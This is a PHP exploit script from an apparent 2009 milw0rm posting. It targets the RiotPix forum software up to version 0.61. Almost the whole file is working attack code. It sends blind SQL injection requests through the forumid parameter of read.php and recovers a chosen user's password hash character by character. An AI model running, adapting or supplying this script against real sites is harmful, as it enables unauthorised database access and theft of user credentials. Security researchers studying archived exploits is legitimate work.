<?php

/*

	$Id: riotpix-0.61.txt,v 0.1 2009/01/06 03:47:30 cOndemned Exp $

	RiotPix <= 0.61 (forumid) Blind SQL Injection Exploit
	Bug found && Exploited by cOndemned

	Download :
		
		http://www.riotpix.com/download/riotpix0_61.zip


	Description :
		
		It's just simple Blind SQL Injection exploit that gets
		password hash of given user. Code is really simple - 
		without proxy, or error handling, but i don't think it is
		important, as long as the RiotPix isn't famous script...
		
	-------------------------------------------------------------------	

	Greetz: 
	
		ZaBeaTy, str0ke, sid.psycho & TWT, wojtus0007, 0in, vCore


		"...What is left to die for, what is left to give..."

*/


	echo "\n[~] RiotPix <= 0.61 (forumid) Blind SQL Injection Exploit";
	echo "\n[~] Bug found && Exploited by cOndemned\n";

	if($argc != 4)
	{
		printf("[!] Usage: php %s <target_size> <username> <topic_id>\n\n", $argv[0]);
		exit;
	}

	list($sploit, $target, $username, $topicid) = $argv;

	$charsArr = array(48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102);
	$pos = 1;

	echo "[~] Password Hash : ";

	while($pos != 33)
	{
		for($i = 0; $i <= count($charsArr); $i++)
		{
			$query = "/read.php?forumid=$topicid+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='$username'),$pos,1)=CHAR({$charsArr[$i]})--";
			$source = file_get_contents($target . $query);
			
			if(!eregi('existent', $source))  
			{
				printf("%s", chr($charsArr[$i]));
				$pos++;
				break;
			}
			flush(STDOUT);
		}
	}

	echo "\n[~] Done\n\n";

?>

# milw0rm.com [2009-01-06]
